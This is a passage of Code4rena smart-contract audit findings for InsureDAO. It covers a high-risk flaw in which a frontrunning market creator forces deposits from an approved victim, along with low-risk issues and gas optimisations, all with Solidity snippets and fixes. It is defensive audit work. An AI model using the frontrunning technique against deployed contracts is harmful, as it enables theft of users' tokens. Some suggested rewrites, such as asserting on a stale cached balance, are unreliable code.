`PoolTemplate.initialize` function, called when creating a market with `Factory.createMarket`, calls a vault function to transfer an initial deposit amount (`conditions[1]`) _from_ the initial depositor (`_references[4]`):  ```solidity // PoolTemplate function initialize(      string calldata _metaData,      uint256[] calldata _conditions,      address[] calldata _references ) external override {      // ...       if (_conditions[1] > 0) {           // @audit vault calls asset.transferFrom(_references[4], vault, _conditions[1])           _depositFrom(_conditions[1], _references[4]);      } }  function _depositFrom(uint256 _amount, address _from)      internal      returns (uint256 _mintAmount) {      require(           marketStatus == MarketStatus.Trading && paused == false,           \"ERROR: DEPOSIT_DISABLED\"      );      require(_amount > 0, \"ERROR: DEPOSIT_ZERO\");       _mintAmount = worth(_amount);      // @audit vault calls asset.transferFrom(_from, vault, _amount)      vault.addValue(_amount, _from, address(this));       emit Deposit(_from, _amount, _mintAmount);       //mint iToken      _mint(_from, _mintAmount); } ```  The initial depositor needs to first approve the vault contract for the `transferFrom` to succeed.  An attacker can then frontrun the `Factory.createMarket` transaction with their own market creation (it does not have access restrictions) and create a market _with different parameters_ but still passing in `_conditions[1]=amount` and `_references[4]=victim`.  A market with parameters that the initial depositor did not want (different underlying, old whitelisted registry/parameter contract, etc.) can be created with their tokens and these tokens are essentially lost.  ## Recommended Mitigation Steps Can the initial depositor be set to `Factory.createMarket`'s `msg.sender`, instead of being able to pick a whitelisted one as `_references[4]`?   "}, {"title": "Lower slack can be higher than upper slack", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/248", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Parameters.setLowerSlack/setUpperSlack` functions do not check that the new value does still satisfy the `_lowerSlack <= _upperSlack` condition.  ## Recommended Mitigation Steps Check that `_lowerSlack <= _upperSlack`  is still satisfied in these functions.   "}, {"title": "Future owner is not cleared", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/247", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Ownership.acceptTransferOwnership` function does not reset `_futureOwner` to zero.  ## Impact The future owner can repeatedly accept the governance, emitting an `AcceptNewOwnership` event each time, bloating listeners for this event with unnecessary data.  ## Recommended Mitigation Steps Reset `_futureOwner` to zero in `acceptTransferOwnership`.   "}, {"title": "Typo for withdawable in multiple places in Parameters.sol  ", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/244", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hubble   # Vulnerability details  Feel free to lower the severity of the issue to Non-critical.  ## Impact Correctness of variable name  ## Proof of Concept File : Parameters.sol    line 39 :    mapping(address => uint256) private _withdawable;   line 153 :         _withdawable[_address] = _target;   line 349-352 :         if (_withdawable[_target] == 0) {             return _withdawable[address(0)];         } else {             return _withdawable[_target];  ## Tools Used Manual review  ## Recommended Mitigation Steps Change typo to _withdrawable   "}, {"title": "Input validation not done in few important functions in Parameters.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/243", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hubble   # Vulnerability details   ## Impact Input validation required for few important parameters as mentioned in the below functions.  ## Proof of Concept File : Parameters.sol    line 120 :     function setUpperSlack(address _address, uint256 _target)           Need to check that the _target value should be less than or equal to 100% (1000)     line 134 :     function setLowerSlack(address _address, uint256 _target)          Need to check that the _target value should be less than or equal to corresponding UpperSlack Value     line 177 :     function setFeeRate(address _address, uint256 _target)           Need to check that the _target value should be less than or equal to 1e6 (1000000)     line 191 :     function setMaxList(address _address, uint256 _target)           Need to check that the _target value should be greater than 1  ## Tools Used Manual review  ## Recommended Mitigation Steps Add require statements with proper value and comments for the respective input fields as given above   "}, {"title": "Inconsistency in pragma solidity version definition in InsureDAOERC20.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/242", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hubble   # Vulnerability details   ## Impact Inconsistency in pragma solidity versions in different solidity files.  ## Proof of Concept File : InsureDAOERC20.sol        pragma solidity ^0.8.0;  All other solidity files in the project        pragma solidity 0.8.7;  ## Tools Used Manual review  ## Recommended Mitigation Steps Set the version to 0.8.7 in the InsureDAOERC20.sol file  "}, {"title": "Constructor not used", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/240", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The constructor is empty. You should remove constructor to save some gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L21 ``` constructor() {} ```  ## Tools Used  ## Recommended Mitigation Steps Remove unused constructor   "}, {"title": "[WP-G18] Avoiding repeated `marketStatus` checks can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/237", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Check `marketStatus` before for loops can save gas from unnecessary repeated checks.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L342-L365  ```solidity function unlockBatch(uint256[] calldata _ids) external {     for (uint256 i = 0; i < _ids.length; i++) {         unlock(_ids[i]);     } }  function unlock(uint256 _id) public {     require(         insurances[_id].status == true &&             marketStatus == MarketStatus.Trading &&             insurances[_id].endTime + parameters.getGrace(msg.sender) <             block.timestamp,         \"ERROR: UNLOCK_BAD_COINDITIONS\"     );     insurances[_id].status == false;      lockedAmount = lockedAmount - insurances[_id].amount;      emit Unlocked(_id, insurances[_id].amount); } ```  ### Recomandation  Change to:  ```solidity function unlockBatch(uint256[] calldata _ids) external {     require(marketStatus == MarketStatus.Trading, \"ERROR: UNLOCK_BAD_COINDITIONS\")     for (uint256 i = 0; i < _ids.length; i++) {         _unlock(_ids[i]);     } }  function unlock(uint256 _id) external {     require(marketStatus == MarketStatus.Trading, \"ERROR: UNLOCK_BAD_COINDITIONS\");     _unlock(_id); }  function _unlock(uint256 _id) internal {     require(         insurances[_id].status == true &&             insurances[_id].endTime + parameters.getGrace(msg.sender) <             block.timestamp,         \"ERROR: UNLOCK_BAD_COINDITIONS\"     );     insurances[_id].status == false;      lockedAmount = lockedAmount - insurances[_id].amount;      emit Unlocked(_id, insurances[_id].amount); } ```   "}, {"title": "[WP-G14] `AuctionBurnReserveSkew.sol#deposit()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/233", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L260-L270  ```solidity if (_available >= _amount) {     _compensated = _amount;     _attributionLoss = vault.transferValue(_amount, msg.sender);     emit Compensated(msg.sender, _amount); } else {     //when CDS cannot afford, pay as much as possible     _compensated = _available;     _attributionLoss = vault.transferValue(_available, msg.sender);     emit Compensated(msg.sender, _available); }  ```  ### Recommendation  Change to:  ```solidity _compensated = _available >= _amount? _amount: _available;  _attributionLoss = vault.transferValue(_compensated, msg.sender); emit Compensated(msg.sender, _compensated); ```  - Duplicated codes removed; - Shorter and simpler code.  "}, {"title": "[WP-G12] Cache function call results in the stack can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/231", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Cache and reusing the function call results, instead of calling it again, can save gas from unnecessary code execution.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L163-L173  ```solidity if (available() < _amount) {      //when USDC in this contract isn't enough     uint256 _shortage = _amount - available();     _unutilize(_shortage);      assert(available() >= _amount); }  balance -= _amount; IERC20(token).safeTransfer(_to, _amount); ```  ### Recommendation  Change to:  ```solidity uint256 availableAmount = available() if ( availableAmount < _amount) {      //when USDC in this contract isn't enough     uint256 _shortage = _amount - available();     _unutilize(_shortage);      assert(availableAmount >= _amount); }  balance -= _amount; IERC20(token).safeTransfer(_to, _amount); ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L295-L304  ```solidity function rate() external view returns (uint256) {     if (totalSupply() > 0) {         return             (vault.attributionValue(crowdPool) * MAGIC_SCALE_1E6) /             totalSupply();     } else {         return 0;     } } ```  `totalSupply()`  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L309-L312  ```solidity if (available() < _retVal) {     uint256 _shortage = _retVal - available();     _unutilize(_shortage); } ```  `available()`  "}, {"title": "[WP-G11] Check of `_amount > 0` can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/230", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  When there are multiple checks, adjusting the sequence to allow the tx to fail earlier can save some gas.  Checks using less gas should be executed earlier than those with higher gas costs, to avoid unnecessary storage read, arithmetic operations, etc when it reverts.  For example:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L238-L256  ```solidity require(paused == false, \"ERROR: PAUSED\"); require(     request.timestamp +         parameters.getLockup(msg.sender) <         block.timestamp,     \"ERROR: WITHDRAWAL_QUEUE\" ); require(     request.timestamp +         parameters.getLockup(msg.sender) +         parameters.getWithdrawable(msg.sender) >         block.timestamp,     \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\" ); require(     request.amount >= _amount,     \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\" ); require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); ```  The check of `_amount > 0` can be done earlier to avoid reading from storage when `_amount = 0`.  ## Recommendation  Change to:  ```solidity         require(paused == false, \"ERROR: PAUSED\");         require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\");         require(             request.amount >= _amount,             \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\"         );         require(             request.timestamp +                 parameters.getLockup(msg.sender) <                 block.timestamp,             \"ERROR: WITHDRAWAL_QUEUE\"         );         require(             request.timestamp +                 parameters.getLockup(msg.sender) +                 parameters.getWithdrawable(msg.sender) >                 block.timestamp,             \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"         ); ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L189-L191  ```solidity uint256 _balance = balanceOf(msg.sender); require(_balance >= _amount, \"ERROR: REQUEST_EXCEED_BALANCE\"); require(_amount > 0, \"ERROR: REQUEST_ZERO\"); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L217-L236  ```solidity require(locked == false, \"ERROR: WITHDRAWAL_PENDING\"); require(     _requestTime + _lockup < block.timestamp,     \"ERROR: WITHDRAWAL_QUEUE\" ); require(     _requestTime + _lockup + parameters.getWithdrawable(msg.sender) >         block.timestamp,     \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\" ); require(     withdrawalReq[msg.sender].amount >= _amount,     \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\" ); require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\");  require(     _retVal <= withdrawable(),     \"ERROR: WITHDRAW_INSUFFICIENT_LIQUIDITY\" ); ```  "}, {"title": "Improper Upper Bound Definition on the Fee", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/229", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor acknowledged", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  defsec   # Vulnerability details  The setFeeRate function does not have any upper or lower bounds. Values that are too large will lead to reversions in several critical functions.  ## Proof of Concept  - The setFeeRate function sets the transaction fee rates for the market in which the function is called. In this context, the transaction fee is the percentage of a transaction that is taken by the protocol and moved to a designated reserve account. As the name suggests, transaction fees factor in to many of the essential transaction types performed within the system. - Navigate to \"https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Parameters.sol#L177\". - On the function there is no upper and lower bound defined. Therefore, users can pay higher fees.  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to define upper and lower bounds on the fee array.  "}, {"title": "Implement check effect interaction to align with best practices", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/227", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  On the InsureDAOERC20, transferFrom function is vulnerable on the re-entrancy.  ## Proof of Concept  1. Navigate to the following contract. Approve function is written after transfer call. It is not possible to exploit on the current environment but that can be possible on the EVM.  ```     function transferFrom(         address sender,         address recipient,         uint256 amount     ) public virtual override returns (bool) {         _transfer(sender, recipient, amount);          uint256 currentAllowance = _allowances[sender][_msgSender()];         require(             currentAllowance >= amount,             \"ERC20: transfer amount exceeds allowance\"         );          _approve(sender, _msgSender(), currentAllowance - amount);          return true;     } ```   ## Tools Used  Code Review  ## Recommended Mitigation Steps   Follow check effect interaction pattern. Consider to use openzeppelin erc20 contract. The sample transferFrom function can be seen from below.   ```   function transferFrom(       address sender,       address recipient,       uint256 amount   ) public virtual override returns (bool) {       uint256 currentAllowance = _allowances[sender][_msgSender()];       if (currentAllowance != type(uint256).max) {           require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");           unchecked {               _approve(sender, _msgSender(), currentAllowance - amount);           }       }        _transfer(sender, recipient, amount);        return true;   } ```  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L161  "}, {"title": "Allowance checks not correctly implemented", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/226", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  On the ERC20, There is a known problem named as Approve/TransferFrom race condition. On the transferFrom, allowance max check has not been added.  ## Proof of Concept  1. Navigate to the following contract.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L152  ```     function transferFrom(         address sender,         address recipient,         uint256 amount     ) public virtual override returns (bool) {         uint256 currentAllowance = _allowances[sender][_msgSender()];         if (currentAllowance != type(uint256).max) {             require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");             unchecked {                 _approve(sender, _msgSender(), currentAllowance - amount);             }         }          _transfer(sender, recipient, amount);          return true;     }  ```  2. Max Allowance check has not been added into the function. ERC20 standart (Openzeppelin) is not followed.  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to use openzeppelin erc20 contract. The sample transferFrom function can be seen from below.   ```     function transferFrom(         address sender,         address recipient,         uint256 amount     ) public virtual override returns (bool) {         uint256 currentAllowance = _allowances[sender][_msgSender()];         if (currentAllowance != type(uint256).max) {             require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");             unchecked {                 _approve(sender, _msgSender(), currentAllowance - amount);             }         }          _transfer(sender, recipient, amount);          return true;     } ```  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L161  "}, {"title": "Malicious Market Creators Can Steal Tokens From Unsuspecting Approved Reference Accounts", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/224", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The current method of market creation involves calling `Factory.createMarket()` with a list of approved `_conditions` and `_references` accounts. If a registered template address has `templates[address(_template)].isOpen == true`, then any user is able to call `createMarket()` using this template. If the template points to `PoolTemplate.sol`, then a malicious market creator can abuse `PoolTemplate.initialize()` as it makes a vault deposit from an account that they control. The vulnerable internal function, `_depositFrom()`, makes a vault deposit from the `_references[4]` address (arbitrarily set to an approved reference address upon market creation).  Hence, if approved `_references` accounts have set an unlimited approval amount for `Vault.sol` before deploying their market, a malicious user can frontrun market creation and cause these tokens to be transferred to the incorrect market.  This issue can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds. If their approval to `Vault.sol` was set to the unlimited amount, malicious users will also be able to force honest market creators to transfer more tokens than they would normally want to allow. ## Proof of Concept  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L158-L231 ``` function createMarket(     IUniversalMarket _template,     string memory _metaData,     uint256[] memory _conditions,     address[] memory _references ) public override returns (address) {     //check eligibility     require(         templates[address(_template)].approval == true,         \"ERROR: UNAUTHORIZED_TEMPLATE\"     );     if (templates[address(_template)].isOpen == false) {         require(             ownership.owner() == msg.sender,             \"ERROR: UNAUTHORIZED_SENDER\"         );     }     if (_references.length > 0) {         for (uint256 i = 0; i < _references.length; i++) {             require(                 reflist[address(_template)][i][_references[i]] == true ||                     reflist[address(_template)][i][address(0)] == true,                 \"ERROR: UNAUTHORIZED_REFERENCE\"             );         }     }      if (_conditions.length > 0) {         for (uint256 i = 0; i < _conditions.length; i++) {             if (conditionlist[address(_template)][i] > 0) {                 _conditions[i] = conditionlist[address(_template)][i];             }         }     }      if (         IRegistry(registry).confirmExistence(             address(_template),             _references[0]         ) == false     ) {         IRegistry(registry).setExistence(             address(_template),             _references[0]         );     } else {         if (templates[address(_template)].allowDuplicate == false) {             revert(\"ERROR: DUPLICATE_MARKET\");         }     }      //create market     IUniversalMarket market = IUniversalMarket(         _createClone(address(_template))     );      IRegistry(registry).supportMarket(address(market));          markets.push(address(market));       //initialize     market.initialize(_metaData, _conditions, _references);      emit MarketCreated(         address(market),         address(_template),         _metaData,         _conditions,         _references     );      return address(market); } ```  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L178-L221 ``` function initialize(     string calldata _metaData,     uint256[] calldata _conditions,     address[] calldata _references ) external override {     require(         initialized == false &&             bytes(_metaData).length > 0 &&             _references[0] != address(0) &&             _references[1] != address(0) &&             _references[2] != address(0) &&             _references[3] != address(0) &&             _references[4] != address(0) &&             _conditions[0] <= _conditions[1],         \"ERROR: INITIALIZATION_BAD_CONDITIONS\"     );     initialized = true;      string memory _name = string(         abi.encodePacked(             \"InsureDAO-\",             IERC20Metadata(_references[1]).name(),             \"-PoolInsurance\"         )     );     string memory _symbol = string(         abi.encodePacked(\"i-\", IERC20Metadata(_references[1]).symbol())     );     uint8 _decimals = IERC20Metadata(_references[0]).decimals();      initializeToken(_name, _symbol, _decimals);      registry = IRegistry(_references[2]);     parameters = IParameters(_references[3]);     vault = IVault(parameters.getVault(_references[1]));      metadata = _metaData;      marketStatus = MarketStatus.Trading;      if (_conditions[1] > 0) {         _depositFrom(_conditions[1], _references[4]);     } } ```  ## Tools Used  Manual code review. Discussions with kohshiba.  ## Recommended Mitigation Steps  After discussions with the sponsor, they have opted to parse a `_creator` address to `PoolTemplate.sol` which will act as the depositor and be set to `msg.sender` in `Factory.createMarket()`. This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved in `Factory.sol` and have also approved `Vault.sol` to make transfers on their behalf.  "}, {"title": "[WP-G7] `InsureDAOERC20#transferFrom()` Check of allowance can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/219", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Check of allowance can be done earlier (before `_transfer()`) to save some gas for failure transactions.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L152-L168  ```solidity function transferFrom(     address sender,     address recipient,     uint256 amount ) public virtual override returns (bool) {     _transfer(sender, recipient, amount);      uint256 currentAllowance = _allowances[sender][_msgSender()];     require(         currentAllowance >= amount,         \"ERC20: transfer amount exceeds allowance\"     );      _approve(sender, _msgSender(), currentAllowance - amount);      return true; } ```   See: -   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/80d8da05644ceef3cd8e81860882571f037f8667/contracts/token/ERC20/ERC20.sol#L162-L169   "}, {"title": "[WP-G6] Remove redundant code can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/218", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Removing `return 0` can make the code simpler and save some gas.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L295-L303  ```solidity     function rate() external view returns (uint256) {         if (totalSupply() > 0) {             return                 (vault.attributionValue(crowdPool) * MAGIC_SCALE_1E6) /                 totalSupply();         } else {             return 0;         }     } ```  ### Recommendation  Can be changed to:  ```solidity     function rate() external view returns (uint256) {         if (totalSupply() > 0) {             return                 (vault.attributionValue(crowdPool) * MAGIC_SCALE_1E6) /                 totalSupply();         }      } ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L312-L317  ```solidity         if (_balance == 0) {             return 0;         } else {             return                 _balance * vault.attributionValue(crowdPool) / totalSupply();         } ```  Can be changed to:  ```solidity if (_balance > 0) {     return         _balance * vault.attributionValue(crowdPool) / totalSupply(); }  ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L176-L176  ```solidity for (uint256 i = 0; i < _references.length; i++) ```  Can be changed to:  ```solidity for (uint256 i; i < _references.length; i++) ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L493-L497  ```solidity if (totalLiquidity() > 0) {     return (totalAllocatedCredit * MAGIC_SCALE_1E6) / totalLiquidity(); } else {     return 0; } ```  Can be changed to:  ```solidity if (totalLiquidity() > 0) {     return (totalAllocatedCredit * MAGIC_SCALE_1E6) / totalLiquidity(); }  ```  "}, {"title": "[WP-N5] Missing error messages in require statements", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/217", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L288-L288  ```solidity require(registry.isListed(msg.sender)); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L100-L100  ```solidity require(address(_template) != address(0)); ```  "}, {"title": "[WP-G4] Remove unnecessary variables can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/216", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L109-L113  ```solidity string memory _name = \"InsureDAO-CDS\"; string memory _symbol = \"iCDS\"; uint8 _decimals = IERC20Metadata(_references[0]).decimals();  initializeToken(_name, _symbol, _decimals); ```  The local variable `_name`, `_symbol`, `_decimals` is used only once. Making the expression inline can save gas.  ### Recommendation  Change to:  ```solidity initializeToken(\"InsureDAO-CDS\", \"iCDS\", IERC20Metadata(_references[0]).decimals()); ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L189-L190  ```solidity uint256 _balance = balanceOf(msg.sender); require(_balance >= _amount, \"ERROR: REQUEST_EXCEED_BALANCE\"); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L257-L257  ```solidity uint256 _surplusAttribution = surplusPool; ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L62-L63  ```solidity uint256 _assetReserve = asset.safeBalance(); require(_assetReserve >= assetReserve + assetIn, 'E304'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L51-L52  ```solidity uint256 _collateralReserve = collateral.safeBalance(); require(_collateralReserve >= collateralReserve + collateralIn, 'E305'); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L456-L463  ```solidity uint256 _shortage; if (totalLiquidity() < _amount) {     //Insolvency case     _shortage = _amount - _value;     uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))         .compensate(_shortage);     _compensated = _value + _cds; } ```  `_shortage` and `_cds`.  "}, {"title": "[WP-G3] `AuctionBurnReserveSkew.sol#deposit()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/215", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L140-L148  ```solidity if (_supply > 0 && _liquidity > 0) {     _mintAmount = (_amount * _supply) / _liquidity; } else if (_supply > 0 && _liquidity == 0) {     //when vault lose all underwritten asset =      _mintAmount = _amount * _supply; //dilute LP token value af. Start CDS again. } else {     //when _supply == 0,     _mintAmount = _amount; } ```  ### Recommendation  Change to:  ```solidity if (_supply == 0) {     _mintAmount = _amount; } else {     _mintAmount = _liquidity == 0 ? _amount * _supply : (_amount * _supply) / _liquidity; }  ```  - Removed 2 checks; - Removed 1 branch; - Simpler branch (costs less gas) goes first.  "}, {"title": "[WP-G1] `InsureDAOERC20#transferFrom()` Do not reduce approval on transferFrom if current allowance is type(uint256).max", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/213", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  The Wrapped Ether (WETH) ERC-20 contract has a gas optimization that does not update the allowance if it is the max uint.  The latest version of OpenZeppelin's ERC20 token contract also adopted this optimization.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L152-L168  ```solidity function transferFrom(     address sender,     address recipient,     uint256 amount ) public virtual override returns (bool) {     _transfer(sender, recipient, amount);      uint256 currentAllowance = _allowances[sender][_msgSender()];     require(         currentAllowance >= amount,         \"ERC20: transfer amount exceeds allowance\"     );      _approve(sender, _msgSender(), currentAllowance - amount);      return true; } ```  See: -   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/80d8da05644ceef3cd8e81860882571f037f8667/contracts/token/ERC20/ERC20.sol#L162 -   https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3085  ### Recommendation  Change to:  ```solidity function transferFrom(     address sender,     address recipient,     uint256 amount ) public virtual override returns (bool) {     _transfer(sender, recipient, amount);      uint256 currentAllowance = _allowances[sender][_msgSender()];     if (currentAllowance != type(uint256).max) {         require(             currentAllowance >= amount,             \"ERC20: transfer amount exceeds allowance\"         );          _approve(sender, _msgSender(), currentAllowance - amount);     }      return true; } ```  "}, {"title": "Avoid unnecessary code execution can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/210", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact ``` function rate() external view returns (uint256) {         if (totalSupply() > 0) {             return (totalLiquidity() * MAGIC_SCALE_1E6) / totalSupply();         } else {             return 0;         }     } ```  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L512-L518  ## Tools Used Remix  ## Recommended Mitigation Steps Change to: ``` function rate() external view returns (uint256) {         if (totalSupply() != 0) {             return (totalLiquidity() * MAGIC_SCALE_1E6) / totalSupply();              }  ```  "}, {"title": "Vault. withdrawValue will fail on subtraction if there are not enough _attributions", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/197", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  System will fail on low-level subtraction without proper logic level error, which can be an issue for troubleshooting and further programmatic usages by other projects.   ## Proof of Concept  Whenever user lacks _attributions 